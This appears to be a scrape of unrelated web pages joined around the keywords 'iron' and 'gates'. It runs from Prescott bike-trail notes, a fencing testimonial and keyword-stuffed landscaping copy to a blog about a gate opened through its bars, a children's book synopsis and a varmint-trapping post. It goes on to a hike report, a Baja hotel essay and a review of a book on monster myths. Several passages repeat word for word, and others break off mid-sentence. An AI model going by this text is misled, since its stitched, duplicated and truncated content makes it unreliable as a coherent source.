<p>&#xa0;</p>   <p>. &#xa0;This is a fun but cardio intensive ride at 4.5 miles will give you a good work out.&#xa0;The trail starts at the White Spar campground just off of White Spar Road just minutes south of downtown Prescott. A winding climb brings you to a small overlook with good views of the mountains west of town. Then a short downhill to the pond and the real climb begins. The first 1/4 mile is the toughest then it steps it&#x2019;s way to the saddle. Be sure to look off to your left while you climb to see Goldwater Lake. Then a gentle downhill through the trees and the final climb up to Senator Highway.</p>   <p>&#xa0;</p>   <p>This is a trail that &#xa0;encompasses&#xa0;the majority of Prescott trails. going around the city. Has total length 56.9 miles. Can be done in one, two, or more days. There are many places where support and/or camping is available. This ride is largely single-track, about 1-1.5 miles of pavement, and a little double-track thrown-in. &#xa0;Click on link or picture for more details.</p>   <p>&#xa0;</p>   <p>&#xa0;</p>   <p>. One of the Mountain Biker Lady&#x2019;s favorites!.&#xa0;Part of the , Trail #332 rises and falls over the hilly terrain of Arizona&#x2019;s central highlands. Exposed slopes of chaparral and pinyon-juniper woodland are interspersed with shady groves of ponderosa pine where a variety of bird calls can be heard ringing out from among the trees. There are nice views of both Thumb Butte and Granite Mountain&#x2014;Prescott&#x2019;s most prominent landmarks. This trail is notable because it provides a route between these two features. Best to go up to Thumb Butte road and park in dirt lot where trail 218 starts over 1.5 miles past Thumb Butte Rec Area. </p>   <p>&#xa0;</p>   <p><em> This kicked Mountain Biker Lady&#x2019;s bum</em>. Each year puts on an event the 15, 30 and 50 proof race events. The Whiskey Off-Road 30 Proof course begins with a brief stay and steep climb on the pavement heading out to the endless singletrack offerings located in Prescott National Forest. Once in the forest, the route features technical singletrack, burly water bars, daunting creek crossings, smooth fire roads, quality climbing, and awesome vistas. For all the details click on the link above to get the full route. This is high intermediate to advanced skills course.</p>   <p>. There are a series of semi technical trails at the recreation area.&#xa0;These trails are open to hikers, horseback riders, and mountain bikes. Horses, however, are not permitted in the picnic area and riders must access these trails by way of FR 9401B, located 0.9 miles west of the Thumb Butte area parking lot.</p>   <p>&#xa0;</p>   <p>&#xa0;</p>   <p>Here are some other trails in the area  </p>   </div>

   <div>   <div>    <p>We recently bought a new house just outside of Melbourne. It&#x2019;s a beautiful old Victorian era home on an acre, perfect for the kids. There&#x2019;s even a little pond in the back yard. However, the fencing on the street-side of the property was pretty old and falling apart, so we decided we&#x2019;d have to replace it straight away. My wife and I are really fond of the black wrought <b>iron</b> look and had a look around to see what we could find. We both kept coming back to Haven Fencing.</p>    <p>Haven Fencing gave us an obligation free quote for the whole job, and it was by far the best we found. They could even do an automatic driveway gate for us. We ended up getting them to do the fencing for the entire property, not just the street-side, that&#x2019;s how happy we were with their work. The guys were very friendly, showed up when the said they would, and made sure to clean up after themselves once they were finished. I&#x2019;ve got no problem recommending Haven to anyone in need of fencing &#x2013; they&#x2019;ve got the best value for money fencing and has to offer.</p>    <h2>Related Posts via Categories</h2>   </div>  </div>

   <div>   <div>    <p>There are many factors to consider in landscape design El Mirage AZ 85335. Landscaping can be a do-it-yourself project or can be done by landscape professionals like landscape architects and contractors. Some of the first things to consider are money, time and effort. A budget should be determined to limit overspending. The amount of time and work put into landscaping should also be taken into account. Some other factors might include climate, soil and regulations. Normally, the first step in landscaping is planning. Computer software can be used to model the property being landscaped. Maps and blueprints might be drawn up to show the layout of features and boundaries. Photographs may be taken along with notes to help fill in details. Once the big picture can be seen, lists are made for the types of materials to be used, the types of plants to be added and the tools and equipment that will be needed to do the work. The teams in El Mirage AZ 85335 are great.</p>    <p>In&#xa0;El Mirage AZ 85335 the beginning stage of landscape planning, the elements and theme need to be decided. Water issues have to be addressed such as irrigation and drainage. Installing an irrigation system may require a professional landscaping contractor. Pipes, sprinklers and timer with electrical system should be included in landscaping plans. If the landscaping theme includes swimming pools, waterfalls, fountains or a pond, a landscaping service should also be considered. The amount of light should be taken into account when landscaping.</p>    <p>The types of trees and plants can be a factor in achieving a balance between sun and shade. Different types of lighting at nighttime can add to a landscape&#x2019;s effects. These include up lighting where lights shine from below, down lighting, silhouetting or the addition of lamps, floodlights, or lanterns. Various types of themes are possible but generally depend on the region and the climate. Desert themes that use cactus and plants that are used to dry environments and tropical themes would be more appropriate for warmer climates. Other types of themes might be Japanese, mountain or a winter theme with evergreens.</p>    <p>Some of the preliminary landscaping tasks that might have to be done before planting include soil testing. The pH level has to be set to the type of plants being used. Plant nutrients might also have to be added.</p>    <p>The types of materials to be used may depend on the structures to be built on the landscape. Walkways, steps, paving and retaining walls might require materials used in masonry like brick, stone, sand and concrete. Decks, gazebos, gates and trellises as well as a fence might require a large amount of wood especially in El Mirage AZ 85335</p>    <p>Depending on the task and the materials used, the types of tools and equipment should be selected. Shovels, mattocks and wheelbarrows might be needed when working with dirt. Working with wood might require a saw, hammer and screwdriver as well as a lever, tape measure and drill.</p>    <p>The different plants that should be taken into account include trees, shrubs, grass, flowers and hedges. Some of the popular types of trees include cedar, ash, walnut, popular, oak, fir and pine. Popular flowers include daisies, lilies, aster, iris, tulips, daffodils and rose bushes.</p>    <p>The amount of maintenance with associated tasks also has to be considered when planning a landscape. These tasks include but are not limited to cleaning, fertilizing, lawn care, leaf removal in fall and mowing along with other types of yard work. In winter, snow removal tasks such as salting would have to be considered for its effects on plants that are part of the landscape. If a landscaped property requires too much maintenance for the owners to do it themselves or if a special project or task has to be done, landscape professionals should be brought in to help, especially for very large problems.</p>    <p>There are tree services that can remove dead trees and stumps. Landscape contractors can also perform certain construction tasks like building terraces, driveways, swimming pools and baseball fields. They can also take over routine jobs like grounds keeping, lawn care, pruning, raking and snow removal in winter.

   <div>   <p>The complex where I live is a mix of apartment and townhouse-style condominiums, with a series of locked iron gates providing access to the latter. Though I myself live in the ground-level courtyard, there&#x2019;s another level of townhomes directly above me, along with some nice greenery and even an impromptu vegetable garden or two. And to access this oasis of calm in the big city you must pass through a gate like the one seen above.</p>   <p>One night last week I walked up those very stairs and found a rather sheepish-looking individual waiting outside of it. As I strive to do with fellow human beings whenever I can, I assumed the best:</p>   <p>&#x201c;Lock&#x2019;s giving you trouble, huh?&#x201d;</p>   <p>It&#x2019;s true, the knob on this particular gate is so loose that it&#x2019;s difficult &#x2014; sometimes impossible &#x2014; to get an inserted key to catch on the lock. I reached into a pocket for my keychain but apparently I didn&#x2019;t have to; after giving me a quick once-over the other gentleman squeezed his arm through the iron bars and reached down to open the gate from the inside. No key required.</p>   <p>I offered him a surprised thank-you as he held the gate open for me, and as he continued on ahead my surprise turned to anger. Though this stranger had effectively broken in to the place I call home I wasn&#x2019;t mad at him &#x2014; I was angry with myself for not being so clever. I&#x2019;d fumbled with it so many times, and more than a few I&#x2019;d given up and moved on to a different entrance. In all those botched attempts why did it never occur to me to just reach through and open it from the inside?</p>   <p>Then I started thinking about how the gate itself was a complete farce. Faced with an intruder armed with basic problem-solving skills (which I apparently lack) it had categorically failed to fulfill its sole purpose, to protect the people and property within. It provided my neighbours and I no actual protection, just the illusion thereof.</p>   <p>By now you might be thinking that the physical gate in this little tale is analogous to the software locks and restrictions on our digital media. And you&#x2019;d be exactly right. Whether or not you equate someone&#x2019;s physical belongings to a movie, song or commercial software is up to you; the sole point I&#x2019;m trying to make here is that <em>all</em> locks &#x2014; physical or otherwise &#x2014; can be broken; many of them much easier than you&#x2019;d think.</p>   <p>Oh, and it turns out that the clever fellow who circumvented the gate did indeed have a friend on the inside &#x2014; we crossed paths again the very next evening. I&#x2019;m grateful that he deemed me worthy enough to share his exploit; now I in turn must share it with the management of my complex.</p>  </div>

   <div>   <p> Twelve-year-old Christopher Canning isn&#x2019;t happy that his parents have moved the family from Vancouver to Toronto.&#xa0; The only good thing about the move is that he got the third-floor turret bedroom, well away from his many-assorted-older-brothers and his older sister, Claire.&#xa0; He misses his friends, and, despite his many siblings, finds himself at loose ends in this new city.&#xa0; Perhaps that is why, when he is out walking the family dog, Marbles, he notices something unusual about the small park next to his house. The park is enclosed by bushes, a fence, and <b>iron</b> <b>gates</b> that seem permanently locked to keep out intruders.&#xa0; Through the <b>gates</b>, Christopher can see a stone fountain, some benches and an apple tree.&#xa0; On either side of the <b>gates</b> are posts each topped by a stone gargoyle. One day, Christopher looks up to see that one of the stone gargoyles is holding an apple.&#xa0; He finds it odd that the someone has taken a bite of that apple.&#xa0; He hears a strange, leathery voice whisper, &#x201c;Bellato smethen sawchen,&#x201d; and, at the same time, the translation, &#x201c;DO NOT throw the apple at that boy.&#x201d;&#xa0; Distracted by Marbles&#x2019; barking, Christopher heads home to take the dog for a walk.&#xa0; As he is getting the dog&#x2019;s leash and toy, the boy hears a whack as something hits the door.&#xa0; He opens it to find an apple lying on the doorstep. It&#x2019;s missing a bite. After dinner that evening, Christopher opens his bedroom window to enjoy the sound of the park&#x2019;s fountain while he plays his guitar.&#xa0; When he finishes playing, he is surprised to hear the sound of someone clapping. The following day, he slips between the <b>iron</b> bars of the <b>gates</b> and into the park.&#xa0; He pokes around the bushes, studies the fountain, and smells pipe smoke, but sees no one.&#xa0; Then his eyes find the apple tree and its beautiful golden apples, and his nose catches their delicious aroma.&#xa0; He is just about to pick an apple when a whispery voice asks, &#x201c;Are you stealing that apple, thief?&#x201d;&#xa0; Startled, he runs from the park, followed by an excited Marbles.&#xa0; As he makes his escape, someone throws apples at him. Preoccupied by the park and his strange experience there, Christopher mentions it to Katherine, the girl with whom he is working on an assignment in class.&#xa0; He often finds himself riding the streetcar with her because Katherine pays regular visits to her Aunt Cassandra who owns Candles by Daye, a candle shop across the street from the park and his house.&#xa0; He is taken aback when the girl warns him very clearly to stay away from the park. Christopher avoids the park for the next few days but is drawn back between the <b>gates</b>&#x2019; <b>iron</b> bars after Mittens&#x2019; favourite ball goes flying over the fence.&#xa0; He doesn&#x2019;t slip in to retrieve the ball, it comes sailing back to land at his feet.&#xa0; He goes to find out what&#x2019;s going on in park.&#xa0; What he discovers is beyond anything he could have imagined. The park is inhabited by two gargoyles.&#xa0; Not two stone statues of gargoyles, but by two living, breathing creatures with leathery grey skin, folded wings and claws, each with a pouch slung over its shoulders.&#xa0; Named Gargoth and Ambergine, the creatures have existed for hundreds of years, since they were carved by an extraordinary French stone carver named Tallus.&#xa0; Recently reunited after Gargoth was rescued from the wealthy, obsessive and very unpleasant Collector, who had kept him caged for decades, the two gargoyles divide their time between the park and the rooftop garden of the candle shop across the street. Christopher also meets Cassandra Daye, Kathleen&#x2019;s aunt and owner of Candles by Daye.&#xa0; She invites him to tea, where he surprises a disapproving Kathleen, and learns that the two have been helping to hide the gargoyles&#x2019; existence from city residents and, particularly, to keep Gargoth from falling back into the hands of the Collector, who had bought a house near the park and spends his days lurking nearby plotting how to capture him.&#xa0; The boy is sworn to secrecy by Kathleen, and then spends a delightful evening getting to know the rather grumpy Gargoth and his rather sweeter companion Ambergiine. In the weeks that follow, Christopher and Kathleen become good friends, and he spends hours in the park or in the rooftop garden across the street.&#xa0; He delights in having a wonderful secret that none of his many-assorted-older-brothers and his older sister don&#x2019;t share, opens his window every evening to serenade the gargoyles on his guitar, and gets used to ducking the odd apple thrown by Gargoth. Then, one late fall night, disaster strikes.&#xa0; Gargoth nods off in the apple tree next to Ambergine, and the Collector attacks.&#xa0; He chops down the apple tree and grabs Ambergine.&#xa0; Badly injured and anguished over the loss of his friend, Gargoth takes refuge in a small cemetery on the other side of town.&#xa0; Christopher, Kathleen and Cassandra find the park vandalized and the gargoyles gone, and call the police.&#xa0; Though they give the officers a detailed description of the Collector, both the gargoyles and the evil little man have disappeared.&#xa0; Will Christopher and Kathleen find the missing gargoyles?&#xa0; Will Gargoth survive his injuries?&#xa0; Will Ambergine escape from the Collector?&#xa0; Read <em>The Gargoyle at the <b>Gates</b></em> to find out! Written by Philippa Dowding, <em>The Gargoyle at the <b>Gates</b></em> is the third book in the <em>Lost Gargoyle</em> series.&#xa0; It tells the story of Gargoth and Ambergine, two gargoyles who live in an abandoned park in downtown Toronto, and their two human friends, Christopher and Kathleen, who protect them and delight in their company, until the creatures are attacked and one is captured by the Collector, a nasty and obsessive little man determined to reclaim Gargoth whom he regards as his possession.&#xa0; Both the human and gargoyle protagonists are charmingly quirky.&#xa0; The plot, which weaves the events in that little park with a second storyline about a reclusive English grandfather, his sixteen-year-old Canadian grandson, and their search for evidence of the existence of Tallus gargoyles, is both absorbing and deliciously fantastical.&#xa0; A satisfying book for readers from Grade 4.

The gate was custom designed and fabricated for the gentleman who now owns the ranch. His son&#x2019;s wedding was coming up soon and the project was time critical. We were able to get the gate delivered to him to be installed with a couple days to spare before the wedding. A <strong>whitetail deer</strong> is featured on the other half of the gate. A truly one-of-a-kind design with all design rights privately held by gate owner.</p>   <h2>New York Metal Art Driveway <b>Gates</b> with Bear Theme</h2>   <p>This 16&#x2032; <strong>bear-themed entry gate</strong> was built for a fun couple who spend their time between Florida and their family farm, the Mountain View Estate, in the beautiful Adirondacks in upstate New York.

The gate was custom designed and fabricated for the gentleman who now owns the ranch. His son&#x2019;s wedding was coming up soon and the project was time critical. We were able to get the gate delivered to him to be installed with a couple days to spare before the wedding. A <strong>whitetail deer</strong> is featured on the other half of the gate. A truly one-of-a-kind design with all design rights privately held by gate owner.</p>   <h2>New York Metal Art Driveway Gates with Bear Theme</h2>   <p>This 16&#x2032; <strong>bear-themed entry gate</strong> was built for a fun couple who spend their time between Florida and their family farm, the Mountain View Estate, in the beautiful Adirondacks in upstate New York.

   <div>   <div>    <p>We recently bought a new house just outside of Melbourne. It&#x2019;s a beautiful old Victorian era home on an acre, perfect for the kids. There&#x2019;s even a little pond in the back yard. However, the fencing on the street-side of the property was pretty old and falling apart, so we decided we&#x2019;d have to replace it straight away. My wife and I are really fond of the black wrought iron look and had a look around to see what we could find. We both kept coming back to Haven Fencing.</p>    <p>Haven Fencing gave us an obligation free quote for the whole job, and it was by far the best we found. They could even do an automatic driveway gate for us. We ended up getting them to do the fencing for the entire property, not just the street-side, that&#x2019;s how happy we were with their work. The guys were very friendly, showed up when the said they would, and made sure to clean up after themselves once they were finished. I&#x2019;ve got no problem recommending Haven to anyone in need of fencing &#x2013; they&#x2019;ve got the best value for money fencing and has to offer.</p>    <h2>Related Posts via Categories</h2>   </div>  </div>

   <div>   <small>May 20th, 2010 </small>   <div>    <p> I have assorted sizes of live traps for the wild animals that start to hang around and raid the compost or eye my chickens. We have a county trapper, which is a free service paid for by my county taxes. So far I have used that service once.</p>    <p>The week before we moved to this house we were at our cabin on the California Salmon River. It was a sunny day and our dog was sleeping in the front yard. I heard the chickens squawking loudly in the orchard behind the cabin. I thought they had seen a snake in the grass or some such. The squawking was so loud our rooster Francis, Bob-O and I all came to see what was going on.</p>    <p>What we saw at the top of the orchard, where the forest met the clearing, was a mountain lion with one of the free ranging hens in its mouth. The hen was clamped so tight in the cat&#x2019;s jaws that the chicken&#x2019;s wing was spread flat like a fan. That cougar&#x2019;s large golden eyes looked right at us, the arm-thick tail twitched back and forth slowly before it turned and melted into the trees. Amelia Airedale, my dog, slept through the whole thing, for which I was grateful.</p>    <p>Since we were moving in just a week I kept the chickens in their coop until we moved here. I quickly turned a small shed into a coop, but it did not have a run yet. For a month or so the chickens ranged at will.</p>    <p>I went to collect the eggs one day and did one of the quickest U-turns you ever saw. There was a skunk sleeping in one of the nest boxes. Now what? I knew skunks are nocturnal so I set my alarm for the wee hours and left the door to the coop open at night. Two nights went by and the skunk did not leave. The chickens would go into the coop at night and roost right by the skunk.</p>    <p>I called the county and they directed me to the county trapper. He came out the next day. He had a cage trap and we wrapped it around the sides with plastic in case the skunk sprayed. We eased a milk crate close to the nest and placed the trap right up against the opening. It was a gray cold drizzly day as we stood outside the coop and stuck sticks through the cracks to wake up and goad the skunk into the trap.</p>    <p>The skunk woke up and moved to the next nest and began eating an egg. This had all taken an hour or more. I told the trapper I understood he had tried his best and that it was okay to shoot it. He did, it sprayed. When he pulled it out of the nest it had open sores on it&#x2019;s head and paws. This freaked me out so much I gave away my flock and began planning the Chicken House of Mystery.</p>    <p>What I found out that day is that even if we had been able to trap the skunk and even if it did look healthy the trapper would have to kill it. It&#x2019;s the policy of the county here. That is why I have my live traps and do not have the trapper come anymore. I have called him since and gotten good advice on where to successfully release wild animals that I trap. Here in our rural county, it&#x2019;s a question of distance rather than location. Too close and the animal will come right back, now wary of the trap! We did trap a raccoon once and per the county trapper&#x2019;s advice we relocated it many miles away very close to a river. </p>    <div>     <p>photo by Bob-O</p>    </div> My last flock of chickens was wiped out in the night by way of the coop door being inadvertently left open one summer night. Before getting the next flock, be they chicks or pullets, I have been on a campaign of varmint removal. I have trapped two possums, a skunk and twice the same orange feral cat that hangs around. We shot the possums and the skunk and I have let the orange tabby go both times talking soothingly to him as I did so. He (orange tabbies are male, calicos are female) does us the favor of keeping the mice population down and saves me the task of burying the gophers, ground squirrels, brown headed cow birds, moles that fall to our varmint eradication program. I have made a small flat altar from basalite bricks out in the yard, close to the garden. We lay the offering on the altar and in the morning it&#x2019;s gone. We know it&#x2019;s the cat because we have used a game camera to take his picture while in the act of dining.    <p>This may sound a little weird but the cat gets fed so it hangs around killing mice and I don&#x2019;t have to have little bodies buried in my yard. We do still bury the rattlesnakes and any varmint carcass too big for the cat to eat. Bob-O dug me a big hole with the backhoe on the sidehill and that is where the larger varmints, and chickens that die of MCD(Mystery Chicken Death), end up.</p>    <p>Right now I have what appears to be raccoons raiding my compost/worm bin out under the apple tree. I have found tiny muddy hand-like footprints trailing across my deck. The worm bed is our old bathtub covered with a couple of pieces of scrap plywood. Every morning the plywood has been pushed aside and the scraps and coffee grounds rifled through.</p>    <p>I had tried to use a piece of freezer burned goat as bait but had no takers. Then I remembered some salmon we had been given, also from the freezer. It was salmon that had traveled all the way from the coast 190 miles to the <b>Iron</b> Gate Dam and Hatchery here on the Klamath. By the time the fish reach here their flesh is almost gray and they are on the verge of death. Salmon do not eat once they leave the ocean to spawn. Although I accepted the gift of the frozen salmon I could not eat it. So I took the salmon out and sawed off one end. I threw this to the back of the trap where the varmint would have to tread on the trap mechanism to get it. I have had raccoons reach their little hands into the trap from the sides, top and bottom through the wires and remove my bait without entering the trap. I prevented this by placing the whole back end of the trap into a slightly larger animal cage. This effectively blocks any assaults from the outside. </p>    <div>     <p>photo by Bob-O</p>    </div> The first night I used the fish bait I caught the cat. The tabby was meowing and the sound was like he had been a smoker, harsh and cracked. I let the cat go. The second and third night the trap sat with the smelly fish and no takers. the fourth morning the trap was still unsprung but the fish was gone. We were at a Green Fair for three days so I closed the trap and did not think of it again until two days ago. A marauder is back at my worm bed. Time to set the trap and the game camera so I can tell if it is a lone varmint or a whole family of varmints. No sense in getting chickens until I get the varmints.    <p>Any animal, domestic or wild, deserves our best efforts to do the right thing. What is right depends on the animal and the circumstances. I have traps that are not live traps, which I use for gophers, moles, wood rats, mice and ground squirrels. If we kill an animal it is done quickly and the carcass buried or left on the altar to feed another animal. Whatever your belief on this you must decide your own course of action. Doing nothing is rarely an option. Living in the woods ain&#x2019;t for sissies, and everybody likes chicken.</p>   </div>   <div>    <p> <span>Comments Off<span> on Varmints vs Locavores</span></span> &#xbb; </p>    <p> Posted in </p>    <p>Tags: </p>   </div>  </div>  
   <div>   <p><b>Iron</b> Mountain is one of the more popular hikes in San Diego County, maybe second only to Cowles Mountain. The trail head is easily accessible, located right off Highway 67 in Poway, offers a reasonably challenging trek for the average person, and on a clear day has some amazing views of northeast San Diego County. Thus it is a &#xa0;common destination for San Diegans looking for a quick outdoor workout.</p>   <p>This is not the trail for quiet solitude, but its still a worthwhile excursion. Be warned that the trail is very exposed and can get incredibly hot during the summer months. Between the heat and the popularity of this spot, its a good idea to plan for an early start. The parking lot tends to fill up on weekends, so aim to beat the crowds and the midday heat by getting there by 8 am or earlier. I&#x2019;m also told this makes a pleasant evening hike if that&#x2019;s your thing (just bring a headlamp in case you&#x2019;re out past dark!).</p>   <p>We made the trek on an early Sunday morning. The morning marine layer kept us nice and cool for the climb up to the peak.</p>   <p>From the main parking lot, we passed through the ornate wooden gate and followed the path. The trail wound back towards the highway then passed through a tunnel of oak trees.</p>   <p>Upon exiting this initial stretch of trees, the trail was wide and exposed, surrounded on either side by chaparral and brown grassland. The peak lay before us to the right, but was shrouded in fog like the rest of the surrounding hills.</p>   <p>At .4 mile we came to an intersection. To the left was a trail to the Ellie Lane staging area &#x2013; an alternative starting point for the hike. To continue to <b>Iron</b> Mountain, we had a choice of continuing straight along the main trail, or taking the side branch to the right. Both routes are roughly equal in length and difficulty, however the side trail is somewhat less travelled. We headed right.</p>   <p>Before long, the trail began to climb gradually, threading its way through tall brush on either side.</p>   <p>At 1 mile we encountered another intersection where we merged with the main trail. A left turn here would lead back to the staging area, so we continued on straight.</p>   <p>A little ways up the trail we found an open spot to enjoy the the view behind us.</p>   <p>We hit a number of pretty steep and rocky sections as we progressed, balanced out by more level stretches in between.</p>   <p>We finally caught a glimpse of one of the blue jays that we could hear squawking in the bushes all around us, but he didn&#x2019;t stay still long enough to get a good picture. At 1.5 miles, halfway to the top, we reached another junction point. Heading left will take you to the Ramona Overlook, and a longer path back to the Ellie Lane Staging Area. We headed right to continue on to the peak.</p>   <p>We continued climbing the dusty trail, our destination still shrouded in fog. For the most part, the brush around us was lower growing than we&#x2019;d seen on the earlier portions of the trail, and we found increasing amounts of beautiful red rocks poking through the brush.</p>   <p>Around 1.67 miles we found the turn off for the trail leading to the helipad. We didn&#x2019;t bother with this detour and stayed on the main trail.</p>   <p>The trail leveled out for a bit as we wound around the edge of the mountain. As we went on the smell of sage was thick in the air. Large rock formations on the trail side caught our eye.</p>   <p>Around 2.25 miles we noticed a small side trail branching off to the right, but we continued along the main trail. Around .1 mile later we found the other end of this side trail, which is simply another alternative route.

   <div>    <p>Sometimes the various worlds that we keep carefully compartmentalized come crashing together. That&#x2019;s what happened to me when I visited the Hotel California in the tiny Baja town of Todos Santos. (Not <i>the</i> Hotel California the Eagles sang about, or at least not exactly, but I&#x2019;ll get to that later.) </p>   <p>In addition to being a travel writer, I&#x2019;m a health writer. When wearing my &#x201c;other hat,&#x201d; I&#x2019;m a Senior Editor at , a health site for people (namely, most of us baby boomers and post-boomers) who are caring for aging parents, spouses, and other family members. For Caring.com I write about cancer and general health, particularly the serious diseases that afflict us as we age. I&#x2019;ve been a health writer for a long time; much longer, actually, than I&#x2019;ve been a travel writer.&#xa0; My stories about nutrition, anxiety, osteoporosis, back pain, and many other subjects have appeared in national magazines, and if people recognize my name at all, it&#x2019;s in that capacity. So I&#x2019;m comfortable talking about health issues, even those that make many people feel sad and uneasy.</p>   <p>But back to my story; I was in as a travel writer, not a health writer. And I was visiting the to see what the organizer of our trip thought was one of the most beautiful &#x2013; and most personal &#x2013; boutique hotels in the region. I instantly agreed; in fact I fell in love with the design sensibility of the hotel, and by association with its creators. I ran around photographing doors, light fixtures, iron gates, potted plants, and waited eagerly to meet the owner, Debbie Stewart. </p>   <p>When Debbie came out of the office, I had lots of questions. I was also researching a story about the influx of American and Canadian seniors moving south to retire in Baja, and wanted to ask her thoughts, since I knew she and her husband had been among the early wave of resident expats. What I didn&#x2019;t expect were the tears that came to her eyes when I asked if they planned to stay in Baja during their later years.&#xa0; It turned out that Debbie had come to Todos Santos, a tiny town an hour north of , with her husband John to carry out a dream &#x2013; <i>his</i> dream. He&#x2019;d found the hotel, which was rumored to be the infamous Hotel California of the eerie Eagles hit. (It&#x2019;s not &#x2013; years of gossip and rumor ended with a journalist asking Don Henley point blank &#x2013; and he said he&#x2019;d never been there.)</p>   <p>It was run down and decrepit when the Stewarts found it, and John&#x2019;s enthusiasm and vision had guided them through six years of hard work to bring it back to vivid, colorful life. They found artisans to make furniture, brought back carved doors from Oaxaca, designed ironwork and had it made by local craftspeople. The incredible artistic detail I&#x2019;d noted had all been John&#x2019;s doing, Debbie said; she&#x2019;d just helped him make it happen. Then in 2006, when the hotel had had a few years to become a success, John found out he had colon cancer. He fought it, but it was fast, and he died in September. He was still young, in his late 50s, hale and healthy, but the cancer won.</p>   <p>Learning that I wrote about cancer, and that I&#x2019;d been inspired to do so by losing my father too young to aggressive esophageal cancer, Debbie talked to me about what a blow John&#x2019;s death had been. She&#x2019;d thought she&#x2019;d return to Canada, she said; her friends and family insisted she come home where they could take care of her. But she couldn&#x2019;t bring herself to leave. She felt compelled to continue to carry out the dream they&#x2019;d created together running the Hotel California, now hugely successful. How could she abandon it now? And Todos Santos had become home. &#x201c;People come back year after year, and they&#x2019;d be crushed if it wasn&#x2019;t the same experience,&#x201d; Debbie says. &#x201c;Many of them have become friends, and then I have so many friends in town. Our New Year&#x2019;s Eve parties are famous around here.&#x201d;</p>   <p>There&#x2019;s also the restaurant, , which has earned fame in its own right, respected by fans of nuevo Mexican food. Voluble chef Dany Lamote, who landed in Baja from Belgium and is now raising his young family here, is a fanatic about the details; I spent an hour with him talking about salt. He makes his own evaporated sea salt, which now sells by the bag in the hotel&#x2019;s gift shop. He also teaches cooking classes and has a cookbook out with recipes from La Coronela, which was selling briskly during my visit. (He&#x2019;s signing it in the photo.)</p>   <p>The afternoon I spent talking to Debbie over Dany&#x2019;s incredible food has stayed with me much more vividly than many other meals, many other visits to lovely hotels. We met to talk travel, and ended up connected by cancer, as I&#x2019;ve ended up connected to many others over the years. I&#x2019;ll be back for a longer stay, because the Hotel California, and the artistic haven of Todos Santos, was one of the most compelling places I&#x2019;ve discovered in Baja. But I&#x2019;ll remember Debbie Stewart for deeper reasons, and I wish her well.</p>   </div>  
   <div>   <p>One of many books I&#x2019;ve been enjoying this autumn is by Stephen T. Asma, an extended look into where formal deviation occurs in the world and what unexpected, often emotionally disconcerting, shapes and forces can result. </p>   <p><small>[Image: The Dariel Pass in the Caucausus Mountains, rumored possible site of the mythic ].</small></p>   <p>According to Asma, measuring these swerves and abnormalities against each other&#x2014;and against ourselves&#x2014;can shed much-needed light on the alternative &#x201c;developmental trajectories&#x201d; by which monsters come into being. This <i>speculative monsterology</i>, as he describes it it, would thus uncover the rules by which even the most stunning mutational transformations occur&#x2014;allowing us to catalog extraordinary beings according to what Asma calls a &#x201c;continuum of strangeness: first, nonnative species, then familiar beasts with unfamiliar sizes or modified body parts, then hybrids of surprising combination, and finally, at the furthest margins, shape-shifters and indescribable creatures.&#x201d; Asma specifically mentions &#x201c;mosaic beings,&#x201d; beings &#x201c;grafted together or hybridized by nature or artifice.&#x201d; </p>   <p>In the book&#x2019;s fascinating first-third&#x2014;easily the book&#x2019;s best section&#x2014;Asma spends a great deal of time describing ancient myths of variation by which monsters were believed to have originated. From the mind-blowing and completely inexplicable discovery of dinosaur bones by ancient societies with no conception of geological time to the hordes of &#x201c;monstrous races&#x201d; believed to exist on the imperial perimeter, there have always been monsters somewhere in the world&#x2019;s geography.</p>   <p>Of specific relevance to an architecture blog, however, are . </p>   <p><small>[Image: Constructing the wall of Dhul-Qarnayn, mythic isotope to Alexander&#x2019;s <b>Gates</b>].</small></p>   <p>Alexander&#x2019;s <b>Gates</b>, Asma writes, were the ultimate wall between the literally Caucasian West and its monstrous opponents, dating back to Alexander the Great: </p>   <blockquote>    Alexander supposedly chased his foreign enemies through a mountain pass in the Caucasus region and then enclosed them behind unbreachable    <b>iron</b>    <b>gates</b>. The details and the symbolic significance of the story changed slightly in every medieval retelling, and it was retold often, especially in the age of exploration.    <p>(&#x2026;) The maps of the time, the <i>mappaemundi</i>, almost always include the <b>gates</b>, though their placement is not consistent. Most maps and narratives of the later medieval period agree that this prison territory, created proximately by Alexander but ultimately by God, houses the savage tribes of , who are referred to with great ambiguity throughout the Bible, and sometimes as individual monsters, sometimes as nations, sometimes as places.</p>   </blockquote>   <p>Beyond this wall was a &#x201c;monster zone.&#x201d;</p>   <p><small>[Image: The geography of Us vs. Them, in a &#x201c;12th century map by the Muslim scholar Al-Idrisi. &#x2018;Yajooj&#x2019; and &#x2018;Majooj&#x2019; (Gog and Magog) appear in Arabic script on the bottom-left edge of the Eurasian landmass, enclosed within dark mountains, at a location corresponding roughly to Mongolia.&#x201d; Via ].</small></p>   <p>Interestingly, a variation of this story is also told within Islam&#x2014;indeed, in the <i>Koran</i> itself. In Islamic mythology, however, Alexander the Great is replaced by a figure called (who might also be a legendary variation on the Persian king ).</p>   <p>Even more interesting than that, however, the <i>Koran</i>&#x2018;s own story of geographically distant monsters entombed behind a vast wall&#x2014;the border fence as theological infrastructure&#x2014;appears to be a kind of literary remix of the so-called . To quote that widely known religious authority , &#x201c;The story of Dhul-Qarnayn in the <i>Qur&#x2019;an</i>&#x2026; matches the Gog and Magog episode in the , which has caused some controversy among Islamic scholars.&#x201d; That is, the <i>Koran</i>, supposedly the exact and holy words of God himself, actually contains a secular myth from 3rd-century Greece. </p>   <p>The construction of Dhul-Qarnayn&#x2019;s wall against the non-Muslim monstrous hordes can specifically be found in verses 18:89-98. For instance: </p>   <blockquote>    &#x201c;&#x2026;Lend me a force of men, and I will raise a rampart between you and them. Come, bring me blocks or    <b>iron</b>.&#x201d; He dammed up the valley between the Two Mountains, and said: &#x201c;Ply your bellows.&#x201d; And when the    <b>iron</b> blocks were red with heat, he said: &#x201c;Bring me molten brass to pour on them.&#x201d; Gog and Magog could not scale it, nor could they dig their way through it.   </blockquote>   <p>Think of it as a kind of religious quarantine&#x2014;a biosafe wall through which no moral contagion could pass.</p>   <p><small>[Image: Constructing the wall of Dhul-Qarnayn, via ].</small></p>   <p>But as with all , and all , there will someday be a breach.</p>   <p>For instance, Asma goes on to cite a book, published in the 14th century, called the . There, we read how Alexander&#x2019;s <b>Gates</b> will, on some future day blackened by the full horror of monstrous return, be rendered completely obsolete: </p>   <blockquote>    In the end, Mandeville predicts, a lowly fox will bring the chaos of invading monsters upon the heads of the Christians. He claims, without revealing how he comes by such specific prophecy, that during the time of the Antichrist a fox will dig a hole through Alexander&#x2019;s    <b>gates</b> and emerge inside the monster zone. The monsters will be amazed to see the fox, as such 